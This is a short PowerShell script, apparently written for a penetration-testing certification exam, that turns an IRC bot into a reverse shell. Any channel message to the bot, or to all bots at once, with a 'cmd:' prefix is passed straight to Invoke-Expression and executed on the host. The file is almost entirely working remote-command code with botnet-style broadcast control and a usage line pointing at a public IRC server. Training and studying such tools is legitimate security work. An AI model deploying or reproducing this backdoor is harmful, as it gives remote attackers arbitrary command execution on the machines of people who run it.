## ShellBot
# A bot that acts as a reverse shell through IRC
# This script has been created for completing the requirements of the SecurityTube PowerShell for Penetration Testers Certification Exam
# http://www.securitytube-training.com/online-courses/powershell-for-pentesters/
# Student ID: PSP-3061
# Requires: https://github.com/alejandro5042/Run-IrcBot
# For more info see: http://lockboxx.blogspot.com/2016/02/irc-shellbot-powershell-for-pentesters.html
# Example Usage: .\Run-IrcBot.ps1 shellbot irc.2600.net 2600

param ($Message, $Bot)

switch -regex ($Message.Text)
{
    "^$($Bot.Nickname):(.*)"
    {
        switch -regex ($Matches[1])
        {
            "hihihi"   { "hello" }
            "lol"  { "glad you're happy!" }
            "test_quit_now"  { "/quit peace!" }
            "cmd:(.*)" {  $(Invoke-Expression $Matches[1]) }
            default
            {
            	@('I fear no one on Earth.', 'I follow God.', 'I bear no ill will toward anyone.', 'I will not submit to injustice.', 'I will conquer untruth with truth.', 'I will put up with suffering.', 'Be the change you wish to see.', 'My life is my message', 'Live as though you would die today.', 'Learn as though you would live forever.', 'Continue to grow and evolve.') | Get-Random
            }
        }
    }
  	"all_bots:(.*)"
    {
        switch -regex ($Matches[1])
        {
            "cmd:(.*)" {  $(Invoke-Expression $Matches[1]) 
        }
		}
	}
}

